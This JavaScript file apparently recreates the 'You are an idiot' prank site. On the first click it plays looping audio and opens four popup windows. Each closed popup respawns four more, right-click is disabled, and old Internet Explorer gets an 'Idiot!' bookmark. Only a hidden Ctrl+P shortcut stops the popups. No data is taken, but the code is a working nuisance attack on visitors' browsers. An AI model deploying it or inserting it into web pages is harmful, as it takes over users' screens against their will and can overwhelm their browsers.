/* Optional audio setup */
document.addEventListener('click', musicPlay);

function musicPlay() {
    var audio = document.getElementById('youare-audio');
    var micon = document.getElementById('youare-micon');

    if (audio && micon) {
        if (audio.duration > 0 && audio.paused) {
            audio.play();
            micon.src = "images/speaker.png";
        } else {
            audio.pause();
            audio.currentTime = 0;
            micon.src = "images/speakerm.png";
        }
    }

    openInitialTabs();
    document.removeEventListener('click', musicPlay);
}

/* Looping background audio */
var faudio = new Audio('youare.mp3');

faudio.addEventListener('timeupdate', function () {
    if (this.currentTime > this.duration - 0.45) {
        this.currentTime = 0;
        this.play();
    }
});

/* Popup tracking */
let popups = [];

/* Open popup window */
function openWindow(x, y) {
    const width = 357;
    const height = 330;

    const win = window.open(
        "lol.html",
        "_blank",
        `menubar=no,status=no,toolbar=no,resizable=yes,
        width=${width},height=${height},
        left=${x},top=${y}`
    );

    if (win) popups.push(win);
    trackPopup(win);
    return win;
}

/* Track and respawn on close (4 at a time) */
function trackPopup(win) {
    const checker = setInterval(() => {
        if (!win || win.closed) {
            clearInterval(checker);
            spawnPopups(4);
        }
    }, 1000);
}

/* Spawn multiple popups at better random screen positions */
function spawnPopups(count) {
    const width = 357;
    const height = 330;

    const screenX = window.screenX || window.screenLeft;
    const screenY = window.screenY || window.screenTop;

    const outerW = window.outerWidth;
    const outerH = window.outerHeight;

    for (let i = 0; i < count; i++) {
        const x = Math.floor(screenX + Math.random() * (outerW - width));
        const y = Math.floor(screenY + Math.random() * (outerH - height));

        openWindow(x, y);
    }
}

/* Initial 4 popups */
function openInitialTabs() {
    spawnPopups(4);
}

/* Close all popups */
function closeAllPopups() {
    popups.forEach(win => {
        try {
            if (win && !win.closed) {
                win.close();
            }
        } catch (e) {}
    });

    popups = [];
}

/* Keyboard shortcut: Ctrl + P */
document.addEventListener('keydown', function (e) {
    if (e.ctrlKey && e.key.toLowerCase() === 'p') {
        e.preventDefault();
        closeAllPopups();
    }
});

/* Optional title changer */
function changeTitle(title) {
    document.title = title;
}

/* Optional bookmark function */
function bookmark() {
    if (
        navigator.appName == "Microsoft Internet Explorer" &&
        parseInt(navigator.appVersion) >= 4
    ) {
        window.external.AddFavorite("lol.html", "Idiot!");
    }
}

/* Disable right click (optional) */
window.oncontextmenu = function () {
    return false;
};

/* Startup */
window.onload = function () {
    bookmark();
};